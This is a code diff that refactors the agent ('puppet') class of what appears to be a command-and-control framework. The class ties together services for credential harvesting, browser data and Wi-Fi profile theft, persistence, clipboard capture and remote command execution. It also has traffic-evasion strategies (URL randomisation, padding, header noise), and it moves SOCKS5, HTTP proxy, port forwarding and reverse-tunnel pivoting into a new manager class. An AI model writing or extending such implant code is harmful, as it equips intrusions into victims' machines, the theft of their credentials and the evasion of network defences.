@@ -1,9 +1,6 @@
 package org.leo.core.puppet.impl;
 
-import org.leo.core.engine.forward.LocalForwardServer;
-import org.leo.core.engine.http.HttpProxyServer;
-import org.leo.core.engine.reverse.ReverseTunnelServer;
-import org.leo.core.engine.socks5.Socks5ProxyServer;
+import org.leo.core.engine.proxy.NetworkProxyManager;
 import org.leo.core.engine.socks5.Socks5ProxyStatistics;
 import org.leo.core.net.Communication;
 import org.leo.core.net.layer.RequestLayer;
@@ -52,6 +49,7 @@ import org.leo.core.puppet.capability.WifiProfileCapable;
 import org.leo.core.puppet.service.*;
 
 import java.util.ArrayList;
+import java.util.Collections;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.List;
@@ -66,6 +64,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     List<ResponseLayer> responseLayers = new ArrayList<>();
 
     private HashMap<String, Set<String>> allLoadedComponent = new HashMap<String, Set<String>>();
+    private final List<ComponentService> componentServices = new ArrayList<ComponentService>();
     BasicInfoService basicInfoService;
     CommandService commandService;
     ComponentService componentService;
@@ -100,12 +99,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     String hostId;
 
     private Communication communication;
-    private Socks5ProxyServer socks5ProxyServer;
-    private HttpProxyServer httpProxyServer;
-    private final HashMap<Integer, LocalForwardServer> localForwardServers
-            = new HashMap<Integer, LocalForwardServer>();
-    private final HashMap<String, ReverseTunnelServer> reverseTunnels
-            = new HashMap<String, ReverseTunnelServer>();
+    private final NetworkProxyManager networkProxyManager = new NetworkProxyManager(this);
 
     /** per-puppet URL 随机化策略 */
     private UrlStrategy urlStrategy;
@@ -134,39 +128,15 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     @Override
     public void setHostId(String hostId) {
         this.hostId = hostId;
-        basicInfoService.setHostId(this.hostId);
-        commandService.setHostId(this.hostId);
-        componentService.setHostId(this.hostId);
-        fileService.setHostId(this.hostId);
-        sqlService.setHostId(this.hostId);
-        testConnService.setHostId(this.hostId);
-        scanService.setHostId(this.hostId);
-        resourceService.setHostId(this.hostId);
-        catalinaManageService.setHostId(this.hostId);
-        execScriptService.setHostId(this.hostId);
-        httpRequestService.setHostId(this.hostId);
-        credentialHarvestService.setHostId(this.hostId);
-        networkInfoService.setHostId(this.hostId);
-        httpSenderService.setHostId(this.hostId);
-        processService.setHostId(this.hostId);
-        registryService.setHostId(this.hostId);
-        scheduledTaskService.setHostId(this.hostId);
-        serviceManagerService.setHostId(this.hostId);
-        eventLogService.setHostId(this.hostId);
-        userAccountService.setHostId(this.hostId);
-        firewallService.setHostId(this.hostId);
-        networkShareService.setHostId(this.hostId);
-        installedSoftwareService.setHostId(this.hostId);
-        dockerContainerService.setHostId(this.hostId);
-        suidCapabilityService.setHostId(this.hostId);
-        browserDataService.setHostId(this.hostId);
-        wifiProfileService.setHostId(this.hostId);
-        persistenceService.setHostId(this.hostId);
-        networkConnectionService.setHostId(this.hostId);
-        mountDiskService.setHostId(this.hostId);
-        clipboardService.setHostId(this.hostId);
+        for (ComponentService service : componentServices) {
+            service.setHostId(hostId);
+        }
     }
-    public void initService(){
+
+    public synchronized void initService(){
+        if (httpSenderService != null) {
+            httpSenderService.close();
+        }
         basicInfoService=new BasicInfoService(communication,requestLayers,responseLayers);
         commandService=new CommandService(communication,requestLayers,responseLayers);
         componentService=new ComponentService(communication,requestLayers,responseLayers);
@@ -199,13 +169,29 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         mountDiskService=new MountDiskService(communication,requestLayers,responseLayers);
         clipboardService=new ClipboardService(communication,requestLayers,responseLayers);
 
-        // 将 URL 随机化策略下发到所有 Service
+        componentServices.clear();
+        Collections.addAll(componentServices,
+                basicInfoService, commandService, componentService, fileService,
+                sqlService, testConnService, scanService, resourceService,
+                catalinaManageService, execScriptService, httpRequestService,
+                credentialHarvestService, networkInfoService, httpSenderService,
+                processService, registryService, scheduledTaskService,
+                serviceManagerService, eventLogService, userAccountService,
+                firewallService, networkShareService, installedSoftwareService,
+                dockerContainerService, suidCapabilityService, browserDataService,
+                wifiProfileService, persistenceService, networkConnectionService,
+                mountDiskService, clipboardService);
+
+        if (hostId != null) {
+            setHostId(hostId);
+        }
+        for (Map.Entry<String, Set<String>> entry : allLoadedComponent.entrySet()) {
+            syncLoadedComponentsToServices(entry.getKey(), entry.getValue());
+        }
+
         applyUrlStrategyToAll();
-        // 将 Padding 策略下发到所有 Service
         applyPaddingStrategyToAll();
-        // 将 Header 噪声策略下发到所有 Service
         applyHeaderNoiseStrategyToAll();
-        // 将 maxReqCount 下发到所有 Service
         applyMaxReqCountToAll();
     }
 
@@ -247,41 +233,28 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     private void applyUrlStrategyToAll() {
         if (urlStrategy == null) return;
-        ComponentService[] services = getAllComponentServices();
-        for (ComponentService svc : services) {
-            if (svc != null) {
-                svc.setUrlStrategy(urlStrategy);
-            }
+        for (ComponentService service : componentServices) {
+            service.setUrlStrategy(urlStrategy);
         }
     }
 
     private void applyPaddingStrategyToAll() {
         if (paddingStrategy == null) return;
-        ComponentService[] services = getAllComponentServices();
-        for (ComponentService svc : services) {
-            if (svc != null) {
-                svc.setPaddingStrategy(paddingStrategy);
-            }
+        for (ComponentService service : componentServices) {
+            service.setPaddingStrategy(paddingStrategy);
         }
     }
 
     private void applyHeaderNoiseStrategyToAll() {
         if (headerNoiseStrategy == null) return;
-        ComponentService[] services = getAllComponentServices();
-        for (ComponentService svc : services) {
-            if (svc != null) {
-                svc.setHeaderNoiseStrategy(headerNoiseStrategy);
-            }
+        for (ComponentService service : componentServices) {
+            service.setHeaderNoiseStrategy(headerNoiseStrategy);
         }
     }
 
     private void applyMaxReqCountToAll() {
-        if (maxReqCount <= 0) return;
-        ComponentService[] services = getAllComponentServices();
-        for (ComponentService svc : services) {
-            if (svc != null) {
-                svc.setMaxReqCount(maxReqCount);
-            }
+        for (ComponentService service : componentServices) {
+            service.setMaxReqCount(maxReqCount);
         }
     }
 
@@ -294,35 +267,9 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     private void syncLoadedComponentsToServices(String hostId, Set<String> componentNames) {
         if (hostId == null || componentNames == null) return;
-        ComponentService[] services = getAllComponentServices();
-        for (ComponentService svc : services) {
-            if (svc != null) {
-                svc.seedLoadedComponents(hostId, componentNames);
-            }
+        for (ComponentService service : componentServices) {
+            service.seedLoadedComponents(hostId, componentNames);
         }
-    }
-
-    private ComponentService[] getAllComponentServices() {
-        return new ComponentService[]{
-            basicInfoService, commandService, componentService, fileService,
-            sqlService, testConnService, scanService, resourceService,
-            catalinaManageService, execScriptService, httpRequestService,
-            credentialHarvestService, networkInfoService, httpSenderService,
-            processService, registryService, scheduledTaskService,
-            serviceManagerService, eventLogService, userAccountService,
-            firewallService, networkShareService, installedSoftwareService,
-            dockerContainerService, suidCapabilityService, browserDataService,
-            wifiProfileService, persistenceService, networkConnectionService,
-            mountDiskService, clipboardService
-        };
-    }
-
-    public Socks5ProxyServer getSocks5ProxyServer() {
-        return socks5ProxyServer;
-    }
-
-    public void setSocks5ProxyServer(Socks5ProxyServer socks5ProxyServer) {
-        this.socks5ProxyServer = socks5ProxyServer;
     }
 
     public List<RequestLayer> getRequestLayers() {
@@ -331,6 +278,9 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     public void setRequestLayers(List<RequestLayer> requestLayers) {
         this.requestLayers = requestLayers;
+        for (ComponentService service : componentServices) {
+            service.setRequestLayers(requestLayers);
+        }
     }
 
     public List<ResponseLayer> getResponseLayers() {
@@ -339,6 +289,9 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     public void setResponseLayers(List<ResponseLayer> responseLayers) {
         this.responseLayers = responseLayers;
+        for (ComponentService service : componentServices) {
+            service.setResponseLayers(responseLayers);
+        }
     }
 
     public int getMaxReqCount() {
@@ -349,6 +302,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     public void setMaxReqCount(int maxReqCount) {
         this.maxReqCount = maxReqCount;
+        applyMaxReqCountToAll();
     }
 
     @Override
@@ -356,11 +310,8 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
         // 聚合所有 ComponentService 实例的已加载组件，避免仅读单一 service 导致漏显
         Set<String> merged = new HashSet<String>();
         if (hostId != null) {
-            ComponentService[] services = getAllComponentServices();
-            for (ComponentService svc : services) {
-                if (svc != null) {
-                    merged.addAll(svc.getLoadedComponentNames(hostId));
-                }
+            for (ComponentService service : componentServices) {
+                merged.addAll(service.getLoadedComponentNames(hostId));
             }
         }
         if (!merged.isEmpty()) return merged;
@@ -506,6 +457,7 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     public Map<String, Object> execCommand(String type, String cmd, String processId) throws Exception {
         if ("write".equals(type)) return commandService.write(cmd, processId);
         if ("read".equals(type))  return commandService.read(processId);
+        if ("resize".equals(type)) return commandService.resize(cmd, processId);
         if ("stop".equals(type))  return commandService.stop(processId);
         return new HashMap<String, Object>();
     }
@@ -526,8 +478,9 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     }
 
     @Override
-    public Map<String, Object> execSql(String driverClassName, String jdbcUrl, String user, String password, String sqlScript) throws Exception {
-        return sqlService.execSql(driverClassName, jdbcUrl, user, password, sqlScript);
+    public Map<String, Object> executeSql(org.leo.core.puppet.database.DatabaseConnectionSpec connection,
+                                          String sqlScript) throws Exception {
+        return sqlService.executeSql(connection, sqlScript);
     }
 
     @Override
@@ -575,338 +528,94 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
     }
 
     @Override
-    public synchronized Map<String, Object> startSocks5Proxy(int port) throws Exception {
-        HashMap<String, Object> res = new HashMap<String, Object>();
-        if (socks5ProxyServer != null) {
-            res.put("code", 200);
-            res.put("msg", "already running");
-            return res;
-        }
-        Socks5ProxyServer server = new Socks5ProxyServer(this, port);
-        server.start();
-        this.socks5ProxyServer = server;
-        res.put("code", 200);
-        res.put("msg", "started");
-        res.put("port", port);
-        return res;
+    public Map<String, Object> startSocks5Proxy(int port) throws Exception {
+        return networkProxyManager.startSocks5Proxy(port);
     }
 
     @Override
-    public synchronized Map<String, Object> stopSocks5Proxy() {
-        HashMap<String, Object> res = new HashMap<String, Object>();
-        if (socks5ProxyServer == null) {
-            res.put("code", 200);
-            res.put("msg", "not running");
-            return res;
-        }
-        try {
-            socks5ProxyServer.stop();
-        } catch (Exception e) {
-            // 忽略停止代理服务器时的异常
-        }
-        socks5ProxyServer = null;
-        res.put("code", 200);
-        res.put("msg", "stopped");
-        return res;
+    public Map<String, Object> stopSocks5Proxy() {
+        return networkProxyManager.stopSocks5Proxy();
     }
 
     @Override
-    public synchronized Map<String, Object> getSocks5ProxyStatus() {
-        HashMap<String, Object> data = new HashMap<String, Object>();
-        if (socks5ProxyServer == null) {
-            data.put("enabled", false);
-            data.put("port", null);
-        } else {
-            data.put("enabled", socks5ProxyServer.isRunning());
-            data.put("port", socks5ProxyServer.getListenPort());
-        }
-        return data;
+    public Map<String, Object> getSocks5ProxyStatus() {
+        return networkProxyManager.getSocks5ProxyStatus();
     }
 
-    /**
-     * 获取SOCKS5代理统计信息
-     * @return 统计信息快照，如果代理未启动则返回null
-     */
     @Override
-    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getSocks5ProxyStatistics() {
-        if (socks5ProxyServer == null) {
-            return null;
-        }
-        Socks5ProxyStatistics stats = socks5ProxyServer.getStatistics();
-        if (stats == null) {
-            return null;
-        }
-        return stats.getSnapshot();
+    public Socks5ProxyStatistics.StatisticsSnapshot getSocks5ProxyStatistics() {
+        return networkProxyManager.getSocks5ProxyStatistics();
     }
 
-    // ==================== HTTP 代理 ====================
-
-    /**
-     * 启动 HTTP 代理服务器
-     */
     @Override
-    public synchronized Map<String, Object> startHttpProxy(int port) throws Exception {
-        Map<String, Object> res = new HashMap<String, Object>();
-        if (httpProxyServer != null && httpProxyServer.isRunning()) {
-            res.put("code", 400);
-            res.put("msg", "HTTP proxy already running on port " + httpProxyServer.getListenPort());
-            return res;
-        }
-        httpProxyServer = new HttpProxyServer(this, port);
-        httpProxyServer.start();
-        res.put("code", 200);
-        res.put("msg", "started");
-        res.put("port", port);
-        return res;
+    public Map<String, Object> startHttpProxy(int port) throws Exception {
+        return networkProxyManager.startHttpProxy(port);
     }
 
-    /**
-     * 停止 HTTP 代理服务器
-     */
     @Override
-    public synchronized Map<String, Object> stopHttpProxy() {
-        Map<String, Object> res = new HashMap<String, Object>();
-        if (httpProxyServer == null || !httpProxyServer.isRunning()) {
-            res.put("code", 400);
-            res.put("msg", "HTTP proxy not running");
-            return res;
-        }
-        httpProxyServer.stop();
-        httpProxyServer = null;
-        res.put("code", 200);
-        res.put("msg", "stopped");
-        return res;
+    public Map<String, Object> stopHttpProxy() {
+        return networkProxyManager.stopHttpProxy();
     }
 
-    /**
-     * 获取 HTTP 代理状态
-     */
     @Override
-    public synchronized Map<String, Object> getHttpProxyStatus() {
-        Map<String, Object> res = new HashMap<String, Object>();
-        if (httpProxyServer != null && httpProxyServer.isRunning()) {
-            res.put("running", true);
-            res.put("port", httpProxyServer.getListenPort());
-        } else {
-            res.put("running", false);
-        }
-        return res;
+    public Map<String, Object> getHttpProxyStatus() {
+        return networkProxyManager.getHttpProxyStatus();
     }
 
-    /**
-     * 获取 HTTP 代理统计信息
-     */
     @Override
-    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getHttpProxyStatistics() {
-        if (httpProxyServer == null) return null;
-        Socks5ProxyStatistics stats = httpProxyServer.getStatistics();
-        return stats == null ? null : stats.getSnapshot();
+    public Socks5ProxyStatistics.StatisticsSnapshot getHttpProxyStatistics() {
+        return networkProxyManager.getHttpProxyStatistics();
     }
 
-    // ==================== 本地端口转发 ====================
-
-    /**
-     * 启动本地端口转发
-     */
     @Override
-    public synchronized Map<String, Object> startLocalForward(int localPort, String targetHost, int targetPort) throws Exception {
-        Map<String, Object> res = new HashMap<String, Object>();
-        if (localForwardServers.containsKey(localPort)) {
-            res.put("code", 400);
-            res.put("msg", "Forward rule already exists for local port " + localPort);
-            return res;
-        }
-        // targetHost:targetPort 连通性预检，3s 超时
-        try {
-            java.net.Socket probe = new java.net.Socket();
-            probe.connect(new java.net.InetSocketAddress(targetHost, targetPort), 3000);
-            probe.close();
-        } catch (Exception e) {
-            res.put("code", 400);
-            res.put("msg", "targetHost:targetPort unreachable: " + targetHost + ":" + targetPort + " (" + e.getMessage() + ")");
-            return res;
-        }
-        LocalForwardServer srv = new LocalForwardServer(this, localPort, targetHost, targetPort);
-        srv.start();
-        localForwardServers.put(localPort, srv);
-        res.put("code", 200);
-        res.put("msg", "started");
-        res.put("localPort", localPort);
-        res.put("targetHost", targetHost);
-        res.put("targetPort", targetPort);
-        return res;
+    public Map<String, Object> startLocalForward(int localPort, String targetHost, int targetPort) throws Exception {
+        return networkProxyManager.startLocalForward(localPort, targetHost, targetPort);
     }
 
-    /**
-     * 停止指定本地端口的转发
-     */
     @Override
-    public synchronized Map<String, Object> stopLocalForward(int localPort) {
-        Map<String, Object> res = new HashMap<String, Object>();
-        LocalForwardServer srv = localForwardServers.remove(localPort);
-        if (srv == null) {
-            res.put("code", 400);
-            res.put("msg", "No forward rule for local port " + localPort);
-            return res;
-        }
-        srv.stop();
-        res.put("code", 200);
-        res.put("msg", "stopped");
-        return res;
+    public Map<String, Object> stopLocalForward(int localPort) {
+        return networkProxyManager.stopLocalForward(localPort);
     }
 
-    /**
-     * 停止所有本地端口转发
-     */
     @Override
-    public synchronized Map<String, Object> stopAllLocalForwards() {
-        for (LocalForwardServer srv : localForwardServers.values()) {
-            srv.stop();
-        }
-        int count = localForwardServers.size();
-        localForwardServers.clear();
-        Map<String, Object> res = new HashMap<String, Object>();
-        res.put("code", 200);
-        res.put("msg", "stopped " + count + " forward(s)");
-        return res;
+    public Map<String, Object> stopAllLocalForwards() {
+        return networkProxyManager.stopAllLocalForwards();
     }
 
-    /**
-     * 列出所有本地端口转发规则
-     */
     @Override
-    public synchronized java.util.List<Map<String, Object>> listLocalForwards() {
-        java.util.List<Map<String, Object>> list = new java.util.ArrayList<Map<String, Object>>();
-        for (LocalForwardServer srv : localForwardServers.values()) {
-            Map<String, Object> item = new HashMap<String, Object>();
-            item.put("localPort", srv.getLocalPort());
-            item.put("targetHost", srv.getTargetHost());
-            item.put("targetPort", srv.getTargetPort());
-            item.put("running", srv.isRunning());
-            list.add(item);
-        }
-        return list;
+    public List<Map<String, Object>> listLocalForwards() {
+        return networkProxyManager.listLocalForwards();
     }
 
-    /**
-     * 获取指定本地端口转发的统计信息
-     */
     @Override
-    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getLocalForwardStatistics(int localPort) {
-        LocalForwardServer srv = localForwardServers.get(localPort);
-        if (srv == null) return null;
-        Socks5ProxyStatistics stats = srv.getStatistics();
-        return stats == null ? null : stats.getSnapshot();
+    public Socks5ProxyStatistics.StatisticsSnapshot getLocalForwardStatistics(int localPort) {
+        return networkProxyManager.getLocalForwardStatistics(localPort);
     }
 
-    // ==================== 反向隧道 ====================
-
-    /**
-     * 启动反向隧道：在 puppet 端监听 remoteListenPort，把进入的连接转发到 C2 侧的 forwardHost:forwardPort。
-     */
     @Override
-    public synchronized Map<String, Object> startReverseTunnel(int remoteListenPort, String bindAddr,
-                                                                String forwardHost, int forwardPort) throws Exception {
-        Map<String, Object> res = new HashMap<String, Object>();
-        // 同 puppet 同 remoteListenPort 不允许重复
-        for (ReverseTunnelServer existing : reverseTunnels.values()) {
-            if (existing.getRemoteListenPort() == remoteListenPort && existing.isRunning()) {
-                res.put("code", 400);
-                res.put("msg", "Reverse tunnel already running on remote port " + remoteListenPort);
-                return res;
-            }
-        }
-        // forwardHost:forwardPort 连通性预检，3s 超时
-        try {
-            java.net.Socket probe = new java.net.Socket();
-            probe.connect(new java.net.InetSocketAddress(forwardHost, forwardPort), 3000);
-            probe.close();
-        } catch (Exception e) {
-            res.put("code", 400);
-            res.put("msg", "forwardHost:forwardPort unreachable: " + forwardHost + ":" + forwardPort + " (" + e.getMessage() + ")");
-            return res;
-        }
-        ReverseTunnelServer server = new ReverseTunnelServer(this, remoteListenPort, bindAddr, forwardHost, forwardPort);
-        // 注册死亡回调：puppet 端 listenId 消失时自动从 map 移除
-        final String listenId = server.getListenId();
-        server.setOnDead(() -> {
-            reverseTunnels.remove(listenId);
-        });
-        server.start();
-        reverseTunnels.put(server.getListenId(), server);
-        res.put("code", 200);
-        res.put("msg", "started");
-        res.put("listenId", server.getListenId());
-        res.put("remoteListenPort", remoteListenPort);
-        res.put("bindAddr", server.getBindAddr());
-        res.put("forwardHost", forwardHost);
-        res.put("forwardPort", forwardPort);
-        return res;
+    public Map<String, Object> startReverseTunnel(int remoteListenPort, String bindAddr,
+                                                   String forwardHost, int forwardPort) throws Exception {
+        return networkProxyManager.startReverseTunnel(remoteListenPort, bindAddr, forwardHost, forwardPort);
     }
 
-    /**
-     * 停止指定反向隧道
-     */
     @Override
-    public synchronized Map<String, Object> stopReverseTunnel(String listenId) {
-        Map<String, Object> res = new HashMap<String, Object>();
-        ReverseTunnelServer srv = reverseTunnels.remove(listenId);
-        if (srv == null) {
-            res.put("code", 400);
-            res.put("msg", "No reverse tunnel for listenId " + listenId);
-            return res;
-        }
-        srv.stop();
-        res.put("code", 200);
-        res.put("msg", "stopped");
-        return res;
+    public Map<String, Object> stopReverseTunnel(String listenId) {
+        return networkProxyManager.stopReverseTunnel(listenId);
     }
 
-    /**
-     * 停止所有反向隧道
-     */
     @Override
-    public synchronized Map<String, Object> stopAllReverseTunnels() {
-        for (ReverseTunnelServer srv : reverseTunnels.values()) {
-            try { srv.stop(); } catch (Exception ignored) {}
-        }
-        int count = reverseTunnels.size();
-        reverseTunnels.clear();
-        Map<String, Object> res = new HashMap<String, Object>();
-        res.put("code", 200);
-        res.put("msg", "stopped " + count + " reverse tunnel(s)");
-        return res;
+    public Map<String, Object> stopAllReverseTunnels() {
+        return networkProxyManager.stopAllReverseTunnels();
     }
 
-    /**
-     * 列出所有反向隧道规则
-     */
     @Override
-    public synchronized java.util.List<Map<String, Object>> listReverseTunnels() {
-        java.util.List<Map<String, Object>> list = new java.util.ArrayList<Map<String, Object>>();
-        for (ReverseTunnelServer srv : reverseTunnels.values()) {
-            Map<String, Object> item = new HashMap<String, Object>();
-            item.put("listenId", srv.getListenId());
-            item.put("remoteListenPort", srv.getRemoteListenPort());
-            item.put("bindAddr", srv.getBindAddr());
-            item.put("forwardHost", srv.getForwardHost());
-            item.put("forwardPort", srv.getForwardPort());
-            item.put("running", srv.isRunning());
-            item.put("startTime", srv.getStartTime());
-            list.add(item);
-        }
-        return list;
+    public List<Map<String, Object>> listReverseTunnels() {
+        return networkProxyManager.listReverseTunnels();
     }
 
-    /**
-     * 获取指定反向隧道的统计信息
-     */
     @Override
-    public synchronized Socks5ProxyStatistics.StatisticsSnapshot getReverseTunnelStatistics(String listenId) {
-        ReverseTunnelServer srv = reverseTunnels.get(listenId);
-        if (srv == null) return null;
-        Socks5ProxyStatistics stats = srv.getStatistics();
-        return stats == null ? null : stats.getSnapshot();
+    public Socks5ProxyStatistics.StatisticsSnapshot getReverseTunnelStatistics(String listenId) {
+        return networkProxyManager.getReverseTunnelStatistics(listenId);
     }
 
     // ==================== HTTP 请求 ====================
@@ -1534,7 +1243,10 @@ public class JavaPuppetNode extends AbstractPuppetNode implements BasicInfoCapab
 
     @Override
     public void close() throws Exception {
-        stopSocks5Proxy();
+        networkProxyManager.close();
+        if (httpSenderService != null) {
+            httpSenderService.close();
+        }
         if (communication instanceof java.io.Closeable closeable) {
             closeable.close();
         } else if (communication instanceof org.java_websocket.client.WebSocketClient webSocketClient) {
